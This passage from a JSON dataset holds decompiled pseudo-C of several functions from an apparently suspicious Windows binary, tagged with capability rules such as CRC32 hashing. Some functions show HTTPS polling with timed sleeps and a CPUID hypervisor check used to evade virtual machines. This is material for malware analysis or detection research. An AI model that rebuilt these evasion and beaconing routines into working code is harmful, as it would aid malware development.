        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409eb1(uchar *param_1)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY15516;\n    uchar auStackY15512 [4];\n    int32_t iStackY15508;\n    uint32_t uStackY15504;\n    int32_t iStackY15500;\n    uint uStackY15492;\n    uchar uStackY15488;\n    uint uStackY15472;\n    uint uStackY15468;\n    uchar *puStackY15460;\n    uint uStackY15444;\n    uint32_t uStackY15440;\n    uchar *puStackY15432;\n    uint uStackY15416;\n    uint32_t uStackY15412;\n    uint32_t uStackY15376;\n    int32_t iStackY15360;\n    uint uStackY15356;\n    uchar *puStackY15348;\n    uint uStackY15332;\n    uint32_t uStackY15328;\n    uchar *puStackY15320;\n    int32_t iStackY15304;\n    uint32_t uStackY15300;\n    uchar auStackY15292 [16];\n    uint uStackY15276;\n    uint uStackY15272;\n    char acStackY15264 [14904];\n    uint uStackY360;\n    int32_t iStackY356;\n    uint uStackY352;\n    uchar *puStackY348;\n    uchar *puStackY344;\n    uint uStackY340;\n    int32_t iStackY336;\n    uint uStackY332;\n    uint uStackY328;\n    uint uStackY324;\n    int32_t iStackY320;\n    int32_t iStackY316;\n    uint uStackY312;\n    uchar *puStackY308;\n    uint uStackY304;\n    uint uStackY300;\n    uint arg_8h;\n    uchar *puStack264;\n    int32_t iStack260;\n    char *pcStack256;\n    uchar *puStack252;\n    char *pcStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uchar *puStack228;\n    \n    fcn.0042cc70();\n    *in_FS_OFFSET = &stack0xffffc374;\n    uStackY15504 = 0;\n    uStackY15328 = 0xf;\n    uStackY15332 = 0;\n    puStackY15348 = puStackY15348 & 0xffffff00;\n    uStackY15356 = 0xf;\n    iStackY15360 = 0;\n    uStackY15376 = uStackY15376 & 0xffffff00;\n    uStackY15300 = 0xf;\n    iStackY15304 = 0;\n    puStackY15320 = puStackY15320 & 0xffffff00;\n    uStackY15412 = 0xf;\n    uStackY15416 = 0;\n    puStackY15432 = puStackY15432 & 0xffffff00;\n    uStackY15440 = 0xf;\n    uStackY15444 = 0;\n    puStackY15460 = puStackY15460 & 0xffffff00;\n    uStackY15468 = 0xf;\n    uStackY15472 = 0;\n    uStackY15488 = 0;\n    uStackY15492._0_1_ = 6;\n    uStackY15492._1_3_ = 0;\n    iStackY15508 = 0;\n    fcn.00409d6d(&stack0xffffc444);\n    uStackY15492._0_1_ = 7;\n    fcn.00403f0c();\n    uStackY15492 = CONCAT31(uStackY15492._1_3_, 6);\n    fcn.00403f73();\n    iVar5 = 8;\n    iVar1 = fcn.0040c0a1();\n    if (iVar1 == 0) {\ncode_r0x00409fc3:\n        iStackY15508 = iVar5;\n    }\n    else {\n        iVar5 = 7;\n        iVar1 = fcn.0040c0a1();\n        if (iVar1 == 0) goto code_r0x00409fc3;\n    }\n    auStackY15512[0] = 0x2f;\n    iStackY15516 = fcn.0040c013(&stack0xffffc428, &stack0xffffc368, 1);\n    if (iStackY15516 == -1) {\n        uStackY15272 = 0xf;\n        uStackY15276 = 0;\n        auStackY15292[0] = 0;\n        fcn.00403fb5();\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 8);\n        uStackY15504 = 1;\n    }\n    else {\n        fcn.0040bfdc(&stack0xffffc428, iStackY15516, 0xffffffff);\n        uStackY15492 = 9;\n        uStackY15504 = 2;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 2) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffffd;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 1) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffffe;\n        fcn.00403f73();\n    }\n    puVar2 = puStackY15320;\n    if (iStackY15516 == -1) {\n        iVar1 = iStackY15304;\n        if (uStackY15300 < 0x10) {\n            puVar2 = &stack0xffffc428;\n        }\n    }\n    else {\n        iVar1 = iStackY15516;\n        if (uStackY15300 < 0x10) {\n            puVar2 = &stack0xffffc428;\n        }\n    }\n    puVar3 = puStackY15320;\n    if (uStackY15300 < 0x10) {\n        puVar3 = &stack0xffffc428;\n    }\n    uStackY15272 = 0xf;\n    uStackY15276 = 0;\n    auStackY15292[0] = 0;\n    fcn.0040c322(&stack0xffffc444, puVar3 + iStackY15508, puVar2 + iVar1);\n    uStackY15492._0_1_ = 10;\n    fcn.00403f0c();\n    uStackY15492._0_1_ = 6;\n    fcn.00403f73();\n    iVar1 = fcn.0040bfb7();\n    if (iVar1 == -1) {\n        fcn.00404397();\n        uStackY15492 = 0xc;\n        uStackY15504 = uStackY15504 | 8;\n    }\n    else {\n        fcn.0040bfdc(&stack0xffffc40c, 0, iVar1);\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 0xb);\n        uStackY15504 = uStackY15504 | 4;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 8) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffff7;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 4) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffffb;\n        fcn.00403f73();\n    }\n    iStackY15516 = fcn.0040bfb7();\n    if (iStackY15516 == -1) {\n        uStackY15272 = 0xf;\n        uStackY15276 = 0;\n        auStackY15292[0] = 0;\n        fcn.00403fb5();\n        uStackY15492 = 0xe;\n        uStackY15504 = uStackY15504 | 0x20;\n    }\n    else {\n        fcn.0040bfdc(&stack0xffffc3f0, iStackY15516 + 1, 0xffffffff);\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 0xd);\n        uStackY15504 = uStackY15504 | 0x10;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 0x20) != 0) {\n        uStackY15504 = uStackY15504 & 0xffffffdf;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 0x10) != 0) {\n        uStackY15504 = uStackY15504 & 0xffffffef;\n        fcn.00403f73();\n    }\n    iVar1 = iStackY15516;\n    if (iStackY15516 == -1) {\n        iVar1 = iStackY15360;\n    }\n    fcn.0040bfdc(&stack0xffffc3f0, 0, iVar1);\n    uStackY15492._0_1_ = 0xf;\n    fcn.00403f0c();\n    uStackY15492._0_1_ = 6;\n    fcn.00403f73();\n    if (iStackY15508 < 1) {\n        uStackY15272 = 0xf;\n        uStackY15276 = 0;\n        auStackY15292[0] = 0;\n        fcn.00403fb5();\n        uStackY15492 = 0x11;\n        uStackY15504 = uStackY15504 | 0x80;\n    }\n    else {\n        fcn.0040bfdc(&stack0xffffc428, 0, iStackY15508 + -3);\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 0x10);\n        uStackY15504 = uStackY15504 | 0x40;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 0x80) != 0) {\n        uStackY15504 = uStackY15504 & 0xffffff7f;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 0x40) != 0) {\n        uStackY15504 = uStackY15504 & 0xffffffbf;\n        fcn.00403f73();\n    }\n    iStackY15508 = fcn.0040bfb7();\n    if (iStackY15508 == -1) {\n        uStackY15272 = 0xf;\n        uStackY15276 = 0;\n        auStackY15292[0] = 0;\n        fcn.00403fb5();\n        uStackY15492 = 0x13;\n        uStackY15504 = uStackY15504 | 0x200;\n    }\n    else {\n        fcn.0040bfdc(&stack0xffffc40c, iStackY15508 + 1, 0xffffffff);\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 0x12);\n        uStackY15504 = uStackY15504 | 0x100;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 0x200) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffdff;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 0x100) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffffeff;\n        fcn.00403f73();\n    }\n    if (iStackY15508 == -1) {\n        fcn.00404397();\n        uStackY15492 = 0x15;\n        uStackY15504 = uStackY15504 | 0x800;\n    }\n    else {\n        puStack228 = 0x40a3ff;\n        fcn.0040bfdc(&stack0xffffc40c, 0, iStackY15508);\n        uStackY15492 = CONCAT31(uStackY15492._1_3_, 0x14);\n        uStackY15504 = uStackY15504 | 0x400;\n    }\n    fcn.00403f0c();\n    if ((uStackY15504 & 0x800) != 0) {\n        uStackY15504 = uStackY15504 & 0xfffff7ff;\n        puStack228 = 0x40a44d;\n        fcn.00403f73();\n    }\n    uStackY15492 = 6;\n    if ((uStackY15504 & 0x400) != 0) {\n        puStack228 = 0x40a46a;\n        fcn.00403f73();\n    }\n    puStack228 = &stack0xffffc460;\n    uStack232 = 0x40a47c;\n    fcn.004257d0();\n    (**0x4463c8)();\n    puStack228 = 0x40a4b2;\n    (**0x4463c8)();\n    puStack228 = NULL;\n    uStack232 = 0;\n    uStack236 = 0;\n    uStack240 = 0;\n    uStack244 = 0x43bd76;\n    pcStack248 = 0x40a4c1;\n    iStackY15508 = (**0x4463e8)();\n    pcStack248 = puStackY15460;\n    if (uStackY15440 < 0x10) {\n        pcStack248 = &stack0xffffc39c;\n    }\n    puStack252 = 0x40a4d5;\n    iStackY15516 = fcn.0041ed83();\n    puStack252 = puStackY15432;\n    if (uStackY15412 < 0x10) {\n        puStack252 = &stack0xffffc3b8;\n    }\n    pcStack248 = \"https\";\n    pcStack256 = 0x40a4f0;\n    iVar1 = (**0x4464dc)();\n    iStack260 = (-(iVar1 != 0) & 0xff800000) + 0x4800000;\n    if (iStackY15508 != 0) {\n        pcStack256 = NULL;\n        puStack264 = 0x3;\n        iVar1 = (**0x446504)();\n        if (iVar1 != 0) {\n            puStackY308 = puStackY15348;\n            if (uStackY15328 < 0x10) {\n                puStackY308 = &stack0xffffc40c;\n            }\n            uStackY300 = 0;\n            uStackY304 = 0;\n            uStackY312 = 0x43e0e8;\n            iStackY320 = 0x40a55f;\n            iStackY316 = iVar1;\n            iVar5 = (**0x446548)();\n            if (iVar5 != 0) {\n                iStackY320 = 0;\n                uStackY324 = 0;\n                uStackY328 = 0;\n                uStackY332 = 0;\n                uStackY340 = 0x40a570;\n                iStackY336 = iVar5;\n                uStackY15504 = (**0x4464c8)();\n                uStackY340 = 0;\n                puStackY344 = &stack0xffffc364;\n                puStackY348 = &stack0xfffffef8;\n                uStackY352 = 0x13;\n                iStackY15516 = 0x100;\n                uStackY360 = 0x40a58f;\n                iStackY356 = iVar5;\n                iVar4 = (**0x446560)();\n                if (iVar4 != 0) {\n                    pcStack256 = &stack0xfffffef8;\n                    iStack260 = 0x40a5a6;\n                    iVar4 = fcn.0041ed83();\n                    if (iVar4 == 200) {\n                        if (uStackY15504 != 0) {\n                            pcStack256 = &stack0xffffc370;\n                            iStack260 = 14999;\n                            puStack264 = &stack0xffffc460;\n                            (**0x44640c)();\n                            (&stack0xffffc460)[uStackY15504] = 0;\n                        }\n                        iStack260 = 0x40a5db;\n                        pcStack256 = iVar5;\n                        (**0x4463e4)();\n                        goto code_r0x0040a5db;\n                    }\n                }\n                pcStack256 = \"ERROR\";\n                goto code_r0x0040a5f4;\n            }\ncode_r0x0040a5db:\n            uStackY324 = 0x40a5e4;\n            iStackY320 = iVar1;\n            (**0x4463e4)();\n        }\n        (**0x4463e4)();\n    }\n    pcStack256 = &stack0xffffc460;\ncode_r0x0040a5f4:\n    *(param_1 + 0x14) = 0xf;\n    *(param_1 + 0x10) = 0;\n    *param_1 = 0;\n    iStack260 = 0x40a60a;\n    fcn.00403f50();\n    iStack260 = 0;\n    puStack264 = 0x1;\n    fcn.00403f73();\n    fcn.00403f73();\n    fcn.00403f73();\n    fcn.00403f73();\n    arg_8h = 1;\n    uStackY300 = 0x40a63f;\n    fcn.00403f73();\n    uStackY300 = 0;\n    uStackY304 = 1;\n    puStackY308 = 0x40a64c;\n    fcn.00403f73();\n    puStackY308 = NULL;\n    uStackY312 = 1;\n    iStackY316 = 0x40a659;\n    fcn.00403f73();\n    *in_FS_OFFSET = iStackY15500;\n    uStackY300 = 0x40a676;\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 4235
    },
    "0040b49f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040bae8)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b49f(void)\n\n{\n    uint *noname_18;\n    int32_t iVar1;\n    uint32_t *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack3080;\n    uint uStack3076;\n    uint uStack3072;\n    uint uStack3068;\n    uint uStack3064;\n    uint uStack3060;\n    uint uStack3056;\n    uint uStack3052;\n    uint uStack3048;\n    uint uStack3044;\n    uint uStack3040;\n    uint uStack3036;\n    uint uStack3032;\n    uint uStack3028;\n    uint uStack3024;\n    uint uStack3020;\n    uint uStack3016;\n    uint uStack3012;\n    uint uStack3008;\n    uint uStack3004;\n    uint uStack3000;\n    uint uStack2996;\n    uint uStack2992;\n    uint uStack2988;\n    char *pcStack2984;\n    uint uStack2980;\n    uint uStack2976;\n    uint uStack2972;\n    code *pcStack2968;\n    uchar *puStack2964;\n    uint in_stack_fffff474;\n    uint in_stack_fffff47c;\n    uint in_stack_fffff480;\n    code *arg_8h;\n    uint in_stack_fffff484;\n    uint noname_2;\n    uint in_stack_fffff48c;\n    uchar *in_stack_fffff490;\n    uint in_stack_fffff494;\n    uint32_t uVar3;\n    uchar *in_stack_fffff498;\n    uint32_t in_stack_fffff49c;\n    uchar *in_stack_fffff4a0;\n    uint32_t noname_6;\n    uint uVar4;\n    uint in_stack_fffff4a8;\n    uint noname_14;\n    uchar *puVar5;\n    uint in_stack_fffff4ac;\n    uint in_stack_fffff4b0;\n    uint in_stack_fffff4b4;\n    uint uVar6;\n    uint in_stack_fffff4b8;\n    uint uVar7;\n    char *in_stack_fffff4bc;\n    uint in_stack_fffff4c0;\n    uint uVar8;\n    char *pcVar9;\n    uint arg_24h;\n    uchar *puVar10;\n    uchar *noname_17;\n    uchar *noname_20;\n    uchar *noname_21;\n    uint arg_40h;\n    uchar auStack2756 [4];\n    uint uStack2752;\n    uint32_t uStack2748;\n    uint uStack2732;\n    uint uStack2728;\n    uchar uStack2500;\n    uint uStack2484;\n    uint uStack2480;\n    uchar auStack2420 [8];\n    uchar auStack2412 [8];\n    uchar auStack2404 [24];\n    uchar auStack2380 [8];\n    uchar auStack2372 [1216];\n    uchar auStack1156 [812];\n    uchar uStack344;\n    uchar uStack248;\n    uchar uStack240;\n    uchar uStack232;\n    uchar uStack224;\n    uchar uStack216;\n    uint uStack208;\n    uchar uStack200;\n    uchar uStack144;\n    uchar uStack140;\n    uchar uStack132;\n    uchar uStack128;\n    uchar uStack124;\n    uchar uStack112;\n    uchar uStack104;\n    uchar uStack96;\n    uchar uStack52;\n    uchar uStack44;\n    uchar uStack36;\n    uint uStack28;\n    uint32_t uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack16 = 0x432ec4;\n    uStack20 = *in_FS_OFFSET;\n    uStack28 = *0x443674 ^ &stack0xfffff53c;\n    *in_FS_OFFSET = &stack0xffffffec;\n    uStack2480 = 0xf;\n    uStack2484 = 0;\n    uStack2500 = 0;\n    uStack12 = 0;\n    fcn.0040121a();\n    fcn.00419161();\n    *0x446270 = 40000;\n    *0x44627c = 0;\n    *0x446268 = 0;\n    fcn.004257d0();\n    fcn.00415659();\n    uStack12 = CONCAT31(uStack12._1_3_, 1);\n    (**0x4464ac)();\n    uStack20 = uStack20 & 0xffffff00;\n    fcn.00403f73();\n    fcn.00415d61();\n    uStack28 = CONCAT31(uStack28._1_3_, 2);\n    (**0x4464ac)();\n    uStack36 = 0;\n    fcn.00403f73();\n    fcn.00415901();\n    uStack44 = 3;\n    (**0x4464ac)();\n    uStack52 = 0;\n    fcn.00403f73();\n    while (*0x446278 = (**0x44630c)(),  *0x446278 != 0) {\n        (**0x446344)();\n        (**0x44631c)();\n    }\n    arg_40h = 0;\n    *0x446278 = (**0x446494)();\n    fcn.004257d0();\n    puVar5 = &stack0xfffff6bc;\n    (**0x4464ac)();\n    noname_18 = fcn.00407fb1();\n    uStack96 = 4;\n    if (0xf < noname_18[5]) {\n        noname_18 = *noname_18;\n    }\n    noname_17 = &stack0xfffff6b4;\n    (**0x4464ac)();\n    puVar10 = NULL;\n    arg_24h = 1;\n    uStack104 = 0;\n    fcn.00403f73();\n    while( true ) {\n        uVar8 = 0x43e168;\n        noname_20 = &stack0xfffff4a8;\n        noname_6 = 0x40b6a7;\n        fcn.00407ff7();\n        noname_21 = &stack0xfffff48c;\n        uStack112 = 6;\n        fcn.00408060();\n        uStack112 = 0;\n        noname_2 = 0x40b6c9;\n        fcn.0040a67e(in_stack_fffff48c, in_stack_fffff490, in_stack_fffff494, in_stack_fffff498, in_stack_fffff49c, \n                     in_stack_fffff4a0, noname_6, in_stack_fffff4a8, in_stack_fffff4ac, in_stack_fffff4b0, \n                     in_stack_fffff4b4, in_stack_fffff4b8, in_stack_fffff4bc, in_stack_fffff4c0, uVar8, arg_24h, puVar10\n                     , noname_17, noname_18, puVar5, noname_20, noname_21, arg_40h);\n        in_stack_fffff4c0 = *0x4442dc;\n        if (*0x4442f0 < 0x10) {\n            in_stack_fffff4c0 = 0x4442dc;\n        }\n        pcVar9 = \"ERROR\";\n        uVar8 = 0x40b6ed;\n        iVar1 = (**0x4464dc)();\n        if (iVar1 != 0) {\n            in_stack_fffff4a0 = &stack0xfffff69c;\n            uVar7 = 0xf;\n            uVar6 = 0;\n            noname_6 = noname_6 & 0xffffff00;\n            in_stack_fffff49c = 0x40b713;\n            fcn.00403f50();\n            noname_18 = &stack0xfffff484;\n            uStack124 = 7;\n            in_stack_fffff480 = 0x4442dc;\n            fcn.00404397();\n            uStack128 = 0;\n            in_stack_fffff47c = 0x40b736;\n            fcn.0040a79e(in_stack_fffff480, in_stack_fffff484, noname_2, in_stack_fffff48c, in_stack_fffff490, \n                         in_stack_fffff494, in_stack_fffff498, in_stack_fffff49c, in_stack_fffff4a0, noname_6, \n                         in_stack_fffff4a8, in_stack_fffff4ac, in_stack_fffff4b0, uVar6, uVar7, uVar8);\n        }\n        in_stack_fffff4b8 = *0x4442dc;\n        if (*0x4442f0 < 0x10) {\n            in_stack_fffff4b8 = 0x4442dc;\n        }\n        in_stack_fffff4bc = \"ERROR\";\n        iVar1 = (**0x4464dc)();\n        if (iVar1 != 0) break;\n        uVar6 = 0x43e168;\n        puVar10 = &stack0xfffff498;\n        uVar3 = 0x40b770;\n        fcn.0040801a();\n        noname_17 = &stack0xfffff47c;\n        uStack128 = 9;\n        fcn.00408060();\n        uStack128 = 0;\n        uVar8 = 0x40b792;\n        fcn.0040a67e(in_stack_fffff47c, in_stack_fffff480, in_stack_fffff484, noname_2, in_stack_fffff48c, \n                     in_stack_fffff490, uVar3, in_stack_fffff498, in_stack_fffff49c, in_stack_fffff4a0, noname_6, \n                     in_stack_fffff4a8, in_stack_fffff4ac, in_stack_fffff4b0, uVar6, in_stack_fffff4b8, \n                     in_stack_fffff4bc, in_stack_fffff4c0, pcVar9, arg_24h, puVar10, noname_17, noname_18);\n        pcVar9 = \"ERROR\";\n        uVar6 = 0x40b7b1;\n        iVar1 = (**0x4464dc)();\n        if (iVar1 != 0) {\n            in_stack_fffff490 = &stack0xfffff68c;\n            noname_14 = 0xf;\n            uVar4 = 0;\n            uVar3 = uVar3 & 0xffffff00;\n            in_stack_fffff48c = 0x40b7d7;\n            fcn.00403f50();\n            uStack140 = 10;\n            uVar7 = 0x4442dc;\n            puStack2964 = 0x40b7ee;\n            fcn.00404397();\n            uStack144 = 0;\n            puStack2964 = 0x40b7fa;\n            fcn.0040a79e(uVar7, in_stack_fffff474, uVar8, in_stack_fffff47c, in_stack_fffff480, in_stack_fffff484, \n                         noname_2, in_stack_fffff48c, in_stack_fffff490, uVar3, in_stack_fffff498, in_stack_fffff49c, \n                         in_stack_fffff4a0, uVar4, noname_14, uVar6);\n        }\n        uVar8 = *0x4442dc;\n        if (*0x4442f0 < 0x10) {\n            uVar8 = 0x4442dc;\n        }\n        uVar6 = 0x40b819;\n        iVar1 = (**0x4464dc)();\n        if (iVar1 != 0) break;\n        in_stack_fffff498 = &stack0xfffff694;\n        uVar4 = 0xf;\n        uVar7 = 0;\n        in_stack_fffff49c = in_stack_fffff49c & 0xffffff00;\n        in_stack_fffff494 = 0x40b83f;\n        fcn.00403f50();\n        puVar10 = &stack0xfffff47c;\n        uStack132 = 0xb;\n        fcn.0040803d();\n        uStack132 = 0;\n        fcn.0040a79e(in_stack_fffff47c, in_stack_fffff480, in_stack_fffff484, noname_2, in_stack_fffff48c, \n                     in_stack_fffff490, in_stack_fffff494, in_stack_fffff498, in_stack_fffff49c, in_stack_fffff4a0, \n                     uVar6, uVar8, uVar7, uVar4, pcVar9, in_stack_fffff4b8);\n        in_stack_fffff4ac = 0x4442dc;\n        if (0xf < *0x4442f0) {\n            in_stack_fffff4ac = *0x4442dc;\n        }\n        in_stack_fffff4a8 = 0x40b87f;\n        iVar1 = (**0x4464dc)();\n        if (iVar1 != 0) break;\n        in_stack_fffff4b4 = 120000;\n        in_stack_fffff4b0 = 0x40b88e;\n        (**0x44631c)();\n    }\n    *0x446274 = fcn.0041d41d();\n    fcn.004257d0();\n    (**0x4464ac)();\n    puVar5 = &stack0xfffffb7c;\n    (**0x4464ac)();\n    fcn.00416673();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    uVar2 = fcn.0040df93();\n    *0x446264 = fcn.00407e21(uVar2, uVar2 >> 0x20);\n    fcn.0040a890();\n    fcn.00413813();\n    if (*0x446670 != 0) {\n        fcn.00408c16();\n    }\n    fcn.0040ac49();\n    if (*0x44666a != '\\0') {\n        fcn.0040cb3a();\n    }\n    if (*0x44666f != '\\0') {\n        fcn.00409b5c();\n    }\n    if (*0x44666e != '\\0') {\n        fcn.00416d57();\n    }\n    fcn.0041d51e();\n    if ((puVar5 != NULL) && (iVar1 = (**0x4462e8)(),  iVar1 != 0)) {\n        (**0x446508)();\n        iVar1 = (**0x446490)();\n        if (iVar1 != 0) {\n            fcn.004257d0();\n            (**0x4462e8)();\n        }\n    }\n    arg_8h = fcn.0040a92c;\n    (**0x4464e4)();\n    iVar1 = 0;\n    while (*0x446674 == 0) {\n        if (*0x446678 != 0) goto code_r0x0040bac7;\n        if (iVar1 == 0x3c) {\n            puStack2964 = &stack0xfffff498;\n            pcStack2968 = fcn.0040a92c;\n            uStack2972 = 0;\n            uStack2976 = 0;\n            uStack2980 = 0x40ba9e;\n            (**0x4464e4)();\n            iVar1 = 0;\n        }\n        (**0x44631c)();\n        iVar1 = iVar1 + 1;\n    }\n    do {\n        (**0x44631c)();\n    } while (*0x44667c == 0);\ncode_r0x0040bac7:\n    iVar1 = cpuid_Version_info(1);\n    if (((*(iVar1 + 0xc) >> 0x1f & 1U) == 0) && (*0x446268 != 0)) {\n        puStack2964 = 0x40bb31;\n        fcn.00403fb5();\n        uStack200 = 0x11;\n        puStack2964 = 0x1;\n        pcStack2968 = 0x43df80;\n        uStack2972 = 0x40bb62;\n        fcn.00403fb5();\n        uStack208 = CONCAT31(uStack208._1_3_, 0x12);\n        uStack2972 = 2;\n        uStack2976 = 0x43e18c;\n        uStack2980 = 0x40bb92;\n        fcn.00403fb5();\n        uStack216 = 0x13;\n        uStack2980 = 4;\n        pcStack2984 = \"avel\";\n        uStack2988 = 0x40bbc2;\n        fcn.00403fb5();\n        uStack224 = 0x14;\n        uStack2988 = 3;\n        uStack2992 = 0x43e198;\n        uStack2748 = 0xf;\n        uStack2752 = 0;\n        uStack2996 = 0x40bbf2;\n        fcn.00403fb5();\n        uStack232 = 0x15;\n        uStack2996 = 1;\n        uStack3000 = 0x43df80;\n        uStack2728 = 0xf;\n        uStack2732 = 0;\n        uStack2748 = uStack2748 & 0xffffff00;\n        uStack3004 = 0x40bc1e;\n        fcn.00403fb5();\n        uStack240 = 0x16;\n        uStack3004 = 2;\n        uStack3008 = 0x43e19c;\n        uStack3012 = 0x40bc48;\n        fcn.00403fb5();\n        uStack248 = 0x17;\n        uStack3012 = 0x40bc67;\n        fcn.004042ed();\n        uStack248 = 0x18;\n        uStack3012 = 0x40bc84;\n        fcn.004042ed();\n        uStack248 = 0x19;\n        uStack3012 = 0x40bca1;\n        fcn.004042ed();\n        uStack248 = 0x1a;\n        uStack3012 = 0x40bcbe;\n        fcn.004042ed();\n        uStack248 = 0x1b;\n        uStack3012 = 0x40bcdb;\n        fcn.004042ed();\n        uStack248 = 0x1c;\n        uStack3012 = 0x40bcf5;\n        fcn.004042ed();\n        uStack248 = 0x1d;\n        uStack3012 = 0x40bd09;\n        fcn.00403f0c();\n        uStack3012 = 0;\n        uStack3016 = 1;\n        uStack3020 = 0x40bd1a;\n        fcn.00403f73();\n        uStack3020 = 0;\n        uStack3024 = 1;\n        uStack3028 = 0x40bd28;\n        fcn.00403f73();\n        uStack3028 = 0;\n        uStack3032 = 1;\n        uStack3036 = 0x40bd36;\n        fcn.00403f73();\n        uStack3036 = 0;\n        uStack3040 = 1;\n        uStack3044 = 0x40bd44;\n        fcn.00403f73();\n        uStack3044 = 0;\n        uStack3048 = 1;\n        uStack3052 = 0x40bd52;\n        fcn.00403f73();\n        uStack3052 = 0;\n        uStack3056 = 1;\n        uStack3060 = 0x40bd60;\n        fcn.00403f73();\n        uStack3060 = 0;\n        uStack3064 = 1;\n        uStack3068 = 0x40bd6b;\n        fcn.00403f73();\n        uStack3068 = 0;\n        uStack3072 = 1;\n        uStack3076 = 0x40bd79;\n        fcn.00403f73();\n        uStack3076 = 0;\n        uStack3080 = 1;\n        fcn.00403f73();\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        fcn.00403f73(1, 0);\n        uStack344 = 0;\n        fcn.00403f73(1, 0);\n        (**0x4464e4)(0, 0, fcn.0040a92c, &stack0xfffff3f8, 0, 0);\n        (**0x44631c)(60000);\n    }\n    *0x446274 = 0;\n    *0x446278 = 0;\n    fcn.00416b5c();\n    puStack2964 = 0x40be08;\n    fcn.00403f73();\n    *in_FS_OFFSET = uStack208;\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 4830
    },
    "0040e2aa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e2aa(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    code **ppcVar2;\n    code **ppcVar3;\n    int32_t arg_ch_00;\n    int32_t unaff_EBP;\n    int32_t *piVar4;\n    uint var_48h;\n    uint var_24h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x3c);\n    piVar4 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar4 != NULL) && (*piVar4 == 0)) {\n        ppcVar2 = fcn.0041e85d(0x18);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_ch_00 = *(**(unaff_EBP + 0xc) + 0x18);\n            if (arg_ch_00 == 0) {\n                arg_ch_00 = **(unaff_EBP + 0xc) + 0x1c;\n            }\n            fcn.0040e09b(unaff_EBP + -0x48, arg_ch_00);\n            *(unaff_EBP + -0x10) = 1;\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_char_.0;\n            ppcVar3 = fcn.0041de24(unaff_EBP + -0x24);\n            ppcVar2[2] = *ppcVar3;\n            ppcVar2[3] = ppcVar3[1];\n            ppcVar2[4] = ppcVar3[2];\n            ppcVar2[5] = ppcVar3[3];\n            piVar4 = *(unaff_EBP + 8);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        uVar1 = *(unaff_EBP + -0x10);\n        *piVar4 = ppcVar2;\n        if ((uVar1 & 1) != 0) {\n            fcn.0040e115(unaff_EBP + -0x48);\n        }\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 584
    },
    "004172d8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004172d8(code **param_1)\n\n{\n    uint unaff_ESI;\n    code *pcVar1;\n    \n    *param_1 = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    if ((*(param_1 + 0x10) & 1) != 0) {\n        fcn.0041e801(*param_1[4]);\n    }\n    *param_1[4] = 0;\n    *param_1[8] = 0;\n    *param_1[0xc] = 0;\n    *param_1[5] = 0;\n    *param_1[9] = 0;\n    *param_1[0xd] = 0;\n    param_1[0x10] = param_1[0x10] & 0xfffffffe;\n    param_1[0xf] = NULL;\n    pcVar1 = param_1[0xe];\n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (pcVar1 != NULL) {\n        fcn.0040e240();\n        fcn.0041e801(pcVar1);\n    }\n    pcVar1 = param_1[1];\n    fcn.0041e01e(pcVar1);\n    fcn.0041e801(param_1[1], pcVar1, unaff_ESI);\n    return;\n}\n",
        "token_count": 331
    },
    "004179bb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
